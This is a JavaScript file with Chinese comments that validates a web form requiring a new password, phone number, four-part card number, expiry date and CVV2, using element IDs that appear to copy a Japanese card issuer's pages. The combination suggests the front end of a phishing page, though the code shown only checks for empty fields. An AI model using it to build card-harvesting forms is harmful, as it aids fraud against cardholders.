document.addEventListener('DOMContentLoaded', () => {
  // 获取输入框和错误提示元素
  const newPasswordInput = document.getElementById('vp-view-VC0204-001_RS0001_newPassword');
  const newPasswordKakuninInput = document.getElementById('vp-view-VC0204-001_RS0001_newPasswordKakunin');
  const tel1Input = document.getElementById('vp-view-VC0204-001_RS0001_tel1');
  const tel2Input = document.getElementById('vp-view-VC0204-001_RS0001_tel2');
  const tel3Input = document.getElementById('vp-view-VC0204-001_RS0001_tel3');
  const acct1Input = document.getElementById('vp-view-VC0201-001_RS0010_acct1');
  const acct2Input = document.getElementById('vp-view-VC0201-001_RS0010_acct2');
  const acct3Input = document.getElementById('vp-view-VC0201-001_RS0010_acct3');
  const acct4Input = document.getElementById('vp-view-VC0201-001_RS0010_acct4');
  const monthInput = document.getElementById('vp-view-VC0204-001_RS0001_month');
  const yearInput = document.getElementById('vp-view-VC0204-001_RS0001_year');
  const cvv2Input = document.getElementById('vp-view-VC0204-001_RS0001_cvv2');

  const newPasswordErrorMessage = document.getElementById('vp-view-err_vp-view-VC0204-001_RS0001_newPassword');
  const newPasswordKakuninErrorMessage = document.getElementById('vp-view-err_vp-view-VC0204-001_RS0001_newPasswordKakunin');
  const tel1ErrorMessage = document.getElementById('vp-view-err_vp-view-VC0204-001_RS0001_tel1');
  const tel2ErrorMessage = document.getElementById('vp-view-err_vp-view-VC0204-001_RS0001_tel2');
  const tel3ErrorMessage = document.getElementById('vp-view-err_vp-view-VC0204-001_RS0001_tel3');
  const acct1ErrorMessage = document.getElementById('vp-view-err_vp-view-VC0201-001_RS0010_acct1');
  const acct2ErrorMessage = document.getElementById('vp-view-err_vp-view-VC0201-001_RS0010_acct2');
  const acct3ErrorMessage = document.getElementById('vp-view-err_vp-view-VC0201-001_RS0010_acct3');
  const acct4ErrorMessage = document.getElementById('vp-view-err_vp-view-VC0201-001_RS0010_acct4');
  const monthErrorMessage = document.getElementById('vp-view-err_vp-view-VC0204-001_RS0001_month');
  const yearErrorMessage = document.getElementById('vp-view-err_vp-view-VC0204-001_RS0001_year');
  const cvv2ErrorMessage = document.getElementById('vp-view-err_vp-view-VC0204-001_RS0001_cvv2');

  // 监听输入框的 blur 事件
  newPasswordInput.addEventListener('blur', () => {
    if (!newPasswordInput.value.trim()) {
      newPasswordErrorMessage.style.display = 'block';
      newPasswordInput.style.backgroundColor = '#ffdcd0';
    } else {
      newPasswordErrorMessage.style.display = 'none';
      newPasswordInput.style.backgroundColor = '';
    }
  });

  newPasswordKakuninInput.addEventListener('blur', () => {
    if (!newPasswordKakuninInput.value.trim()) {
      newPasswordKakuninErrorMessage.style.display = 'block';
      newPasswordKakuninInput.style.backgroundColor = '#ffdcd0';
    } else {
      newPasswordKakuninErrorMessage.style.display = 'none';
      newPasswordKakuninInput.style.backgroundColor = '';
    }
  });

  tel1Input.addEventListener('blur', () => {
    if (!tel1Input.value.trim()) {
      tel1ErrorMessage.style.display = 'block';
      tel1Input.style.backgroundColor = '#ffdcd0';
    } else {
      tel1ErrorMessage.style.display = 'none';
      tel1Input.style.backgroundColor = '';
    }
  });

  tel2Input.addEventListener('blur', () => {
    if (!tel2Input.value.trim()) {
      tel2ErrorMessage.style.display = 'block';
      tel2Input.style.backgroundColor = '#ffdcd0';
    } else {
      tel2ErrorMessage.style.display = 'none';
      tel2Input.style.backgroundColor = '';
    }
  });

  tel3Input.addEventListener('blur', () => {
    if (!tel3Input.value.trim()) {
      tel3ErrorMessage.style.display = 'block';
      tel3Input.style.backgroundColor = '#ffdcd0';
    } else {
      tel3ErrorMessage.style.display = 'none';
      tel3Input.style.backgroundColor = '';
    }
  });


  acct1Input.addEventListener('blur', () => {
    if (!acct1Input.value.trim()) {
      acct1ErrorMessage.style.display = 'block';
      acct1Input.style.backgroundColor = '#ffdcd0';
    } else {
      acct1ErrorMessage.style.display = 'none';
      acct1Input.style.backgroundColor = '';
    }
  });

  acct2Input.addEventListener('blur', () => {
    if (!acct2Input.value.trim()) {
      acct2ErrorMessage.style.display = 'block';
      acct2Input.style.backgroundColor = '#ffdcd0';
    } else {
      acct2ErrorMessage.style.display = 'none';
      acct2Input.style.backgroundColor = '';
    }
  });

  acct3Input.addEventListener('blur', () => {
    if (!acct3Input.value.trim()) {
      acct3ErrorMessage.style.display = 'block';
      acct3Input.style.backgroundColor = '#ffdcd0';
    } else {
      acct3ErrorMessage.style.display = 'none';
      acct3Input.style.backgroundColor = '';
    }
  });

  acct4Input.addEventListener('blur', () => {
    if (!acct4Input.value.trim()) {
      acct4ErrorMessage.style.display = 'block';
      acct4Input.style.backgroundColor = '#ffdcd0';
    } else {
      acct4ErrorMessage.style.display = 'none';
      acct4Input.style.backgroundColor = '';
    }
  });

  monthInput.addEventListener('blur', () => {
    if (!monthInput.value.trim()) {
      monthErrorMessage.style.display = 'block';
      monthInput.style.backgroundColor = '#ffdcd0';
    } else {
      monthErrorMessage.style.display = 'none';
      monthInput.style.backgroundColor = '';
    }
  });

  yearInput.addEventListener('blur', () => {
    if (!yearInput.value.trim()) {
      yearErrorMessage.style.display = 'block';
      yearInput.style.backgroundColor = '#ffdcd0';
    } else {
      yearErrorMessage.style.display = 'none';
      yearInput.style.backgroundColor = '';
    }
  });

  cvv2Input.addEventListener('blur', () => {
    if (!cvv2Input.value.trim()) {
      cvv2ErrorMessage.style.display = 'block';
      cvv2Input.style.backgroundColor = '#ffdcd0';
    } else {
      cvv2ErrorMessage.style.display = 'none';
      cvv2Input.style.backgroundColor = '';
    }
  });





  // 获取表单元素
  const form = document.querySelector('form');

  // 监听表单的 submit 事件
  form.addEventListener('submit', (event) => {
    let isValid = true;

    if (!newPasswordInput.value.trim()) {
      newPasswordErrorMessage.style.display = 'block';
      isValid = false;
    } else {
      newPasswordErrorMessage.style.display = 'none';
    }

    if (!newPasswordKakuninInput.value.trim()) {
      newPasswordKakuninErrorMessage.style.display = 'block';
      isValid = false;
    } else {
      newPasswordKakuninErrorMessage.style.display = 'none';
    }

    if (!tel1Input.value.trim()) {
      tel1ErrorMessage.style.display = 'block';
      isValid = false;
    } else {
      tel1ErrorMessage.style.display = 'none';
    }

    if (!tel2Input.value.trim()) {
      tel2ErrorMessage.style.display = 'block';
      isValid = false;
    } else {
      tel2ErrorMessage.style.display = 'none';
    }

    if (!tel3Input.value.trim()) {
      tel3ErrorMessage.style.display = 'block';
      isValid = false;
    } else {
      tel3ErrorMessage.style.display = 'none';
    }

    if (!acct1Input.value.trim()) {
      acct1ErrorMessage.style.display = 'block';
      isValid = false;
    } else {
      acct1ErrorMessage.style.display = 'none';
    }

    if (!acct2Input.value.trim()) {
      acct2ErrorMessage.style.display = 'block';
      isValid = false;
    } else {
      acct2ErrorMessage.style.display = 'none';
    }

    if (!acct3Input.value.trim()) {
      acct3ErrorMessage.style.display = 'block';
      isValid = false;
    } else {
      acct3ErrorMessage.style.display = 'none';
    }

    if (!acct4Input.value.trim()) {
      acct4ErrorMessage.style.display = 'block';
      isValid = false;
    } else {
      acct4ErrorMessage.style.display = 'none';
    }

    if (!monthInput.value.trim()) {
      monthErrorMessage.style.display = 'block';
      isValid = false;
    } else {
      monthErrorMessage.style.display = 'none';
    }

    if (!yearInput.value.trim()) {
      yearErrorMessage.style.display = 'block';
      isValid = false;
    } else {
      yearErrorMessage.style.display = 'none';
    }

    if (!cvv2Input.value.trim()) {
      cvv2ErrorMessage.style.display = 'block';
      isValid = false;
    } else {
      cvv2ErrorMessage.style.display = 'none';
    }


    // 如果有任意一个输入框无效，则阻止表单提交
    if (!isValid) {
      event.preventDefault();
    }

  });


});


